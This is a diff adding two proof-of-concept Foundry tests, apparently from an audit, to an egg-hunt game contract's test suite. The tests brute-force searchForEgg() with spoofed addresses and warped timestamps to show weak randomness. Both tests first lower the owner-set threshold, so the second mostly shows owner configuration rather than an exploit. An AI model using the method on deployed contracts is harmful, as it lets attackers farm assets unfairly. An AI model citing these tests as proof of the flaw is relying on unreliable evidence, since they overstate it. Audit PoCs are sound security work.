@@ -262,4 +262,103 @@ contract EggGameTest is Test {
         vm.expectRevert("Egg not in vault");
         vault.withdrawEgg(40);
     }
+
+    /*//////////////////////////////////////////////////////////////
+                          POC WEAK RANDOMNESS
+    //////////////////////////////////////////////////////////////*/
+
+    function testPoC_AttackerCanFarmEggWithWeakRandomness() public {
+        uint256 duration = 300;
+        game.startGame(duration);
+        game.setEggFindThreshold(50); // Set a low threshold to simulate exploitable conditions
+
+        uint256 eggBefore = game.eggCounter(); // Track how many eggs existed before the PoC
+        address attacker;
+        bool eggFound = false;
+
+        // Simulate up to 100 different attacker addresses, changing the timestamp each time
+        for (uint256 i = 0; i < 100; i++) {
+            attacker = address(
+                uint160(uint256(keccak256(abi.encodePacked(i))))
+            ); // Generate a new address
+            uint256 newTime = block.timestamp + 1;
+            vm.warp(newTime); // Move time forward to change block.timestamp
+
+            console.log("Attempt", i + 1);
+            console.log("  Attacker address:", attacker);
+            console.log("  Timestamp:", newTime);
+
+            vm.prank(attacker); // Spoof msg.sender
+
+            try game.searchForEgg() {
+                // Check if eggCounter has increased — means an egg was successfully farmed
+                if (game.eggCounter() > eggBefore) {
+                    console.log("  Egg FOUND!");
+                    console.log("  New eggCounter:", game.eggCounter());
+                    console.log("  Found by:", attacker);
+                    console.log(
+                        "  Total eggs found by attacker:",
+                        game.eggsFound(attacker)
+                    );
+                    eggFound = true;
+                    break;
+                } else {
+                    console.log(
+                        "searchForEgg() did not mint egg despite success."
+                    );
+                }
+            } catch {
+                console.log("Revert caught - no egg this time");
+            }
+        }
+
+        if (!eggFound) {
+            console.log("No egg was found after 100 attempts.");
+        }
+
+        // Assert that the attacker was able to mint at least one egg
+        assertGt(game.eggCounter(), eggBefore, "Should have farmed an egg");
+    }
+
+    function testPoC_AttackerCanFarmMultipleEggs() public {
+        // Initialize game with a high egg find threshold to make every call successful
+        uint256 duration = 300;
+        game.startGame(duration);
+        game.setEggFindThreshold(100); // 100% chance to mint an egg
+
+        address attacker = address(0xBEEF); // Use a single attacker for multiple attempts
+        uint256 initialEggs = game.eggCounter();
+        uint256 mintAttempts = 10;
+
+        console.log("Starting PoC: attacker farming multiple eggs");
+        console.log("Attacker:", attacker);
+        console.log("Initial eggCounter:", initialEggs);
+
+        // Attacker attempts to mint eggs over multiple blocks
+        for (uint256 i = 0; i < mintAttempts; i++) {
+            uint256 newTime = block.timestamp + 1;
+            vm.warp(newTime); // Move block timestamp forward
+            vm.prank(attacker); // Spoof attacker as msg.sender
+
+            try game.searchForEgg() {
+                console.log("Egg minted on attempt", i + 1);
+                console.log("Current eggCounter:", game.eggCounter());
+                console.log(
+                    "Eggs found by attacker:",
+                    game.eggsFound(attacker)
+                );
+            } catch {
+                console.log("Failed to mint egg on attempt", i + 1);
+                fail(); // Fail the test if egg minting unexpectedly fails
+            }
+        }
+
+        // Check that the attacker minted exactly the number of eggs attempted
+        uint256 finalEggs = game.eggCounter();
+        uint256 totalMinted = finalEggs - initialEggs;
+
+        console.log("PoC complete");
+        console.log("Total eggs minted by attacker:", totalMinted);
+        assertEq(totalMinted, mintAttempts, "Attacker should mint N eggs");
+    }
 }
